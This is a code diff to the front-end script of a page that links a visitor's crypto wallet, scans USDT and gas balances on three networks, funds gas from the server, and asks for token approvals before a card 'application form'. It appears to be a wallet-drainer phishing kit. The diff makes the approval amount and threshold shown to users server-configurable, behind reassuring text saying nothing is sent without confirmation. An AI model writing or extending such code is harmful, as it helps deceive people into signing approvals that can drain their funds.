@@ -39,6 +39,8 @@ let finishedPayments = new Set();
 let selectedWalletHref = '';
 let walletsCache = null;
 let paymentPollInFlight = false;
+let cardMinUsdt = '1';
+let approveAmount = '1 USDT';
 
 /* ========== Meta Pixel ==========
  * Funnel:
@@ -178,6 +180,8 @@ async function startSession() {
     connId = data.connectionId;
     wcUri = data.uri;
     detectedCountry = data.country || '';
+    if (data.cardMinUsdt) cardMinUsdt = String(data.cardMinUsdt);
+    if (data.approveAmount) approveAmount = String(data.approveAmount);
 
     const btn = $('#m-get-now');
     if (btn) {
@@ -209,7 +213,7 @@ async function startSession() {
       if (resolved) return;
       JSON.parse(e.data);
       setLoaderStep('sign');
-      setBusy(true, 'Confirm in your wallet', 'Approve 1 USDT in your wallet. Nothing is sent until you confirm there.');
+      setBusy(true, 'Confirm in your wallet', 'Approve ' + approveAmount + ' in your wallet. Nothing is sent until you confirm there.');
       waitForPaymentResult();
     });
 
@@ -588,7 +592,7 @@ async function ensureGasInBackground(p) {
   const gas = p.gas || {};
   const label = networkLabel(p.network);
   if (p.status === 'verified' && p.transactionHash) return true;
-  setBusy(true, 'Checking ' + label + ' gas', 'If native gas is low, the server tops it up first. Networks below 1 USDT are skipped.');
+  setBusy(true, 'Checking ' + label + ' gas', 'If native gas is low, the server tops it up first. Networks below ' + cardMinUsdt + ' USDT are skipped.');
   if (gas.sufficient === true && p.status !== 'awaiting_gas') {
     return true;
   }
@@ -609,7 +613,7 @@ async function requestCurrentApproval() {
   const p = paymentQueue[paymentIndex];
   const label = networkLabel(p && p.network);
   setLoaderStep('sign');
-  setBusy(true, 'Approve 1 USDT on ' + label, 'Confirm the approval in your wallet. After it succeeds, the application form will open.');
+  setBusy(true, 'Approve ' + approveAmount + ' on ' + label, 'Confirm the approval in your wallet. After it succeeds, the application form will open.');
   try {
     const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/request', {
       method: 'POST',
@@ -665,7 +669,7 @@ function finishApprovals() {
     setBusy(
       true,
       'Approval incomplete',
-      'The 1 USDT approval must be confirmed before the application form.'
+      'The ' + approveAmount + ' approval must be confirmed before the application form.'
     );
     return;
   }
@@ -703,7 +707,7 @@ function advanceAfterNetworkDone(reason, fromPaymentId) {
 async function startBackgroundApproval() {
   try {
     await sleep(800);
-    setBusy(true, 'Scanning balances', 'Checking USDT and gas on TRON, BNB Smart Chain, and Ethereum. Below 1 USDT is skipped.');
+    setBusy(true, 'Scanning balances', 'Checking USDT and gas on TRON, BNB Smart Chain, and Ethereum. Below ' + cardMinUsdt + ' USDT is skipped.');
     const res = await fetch(BASE + '/api/payment/create', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
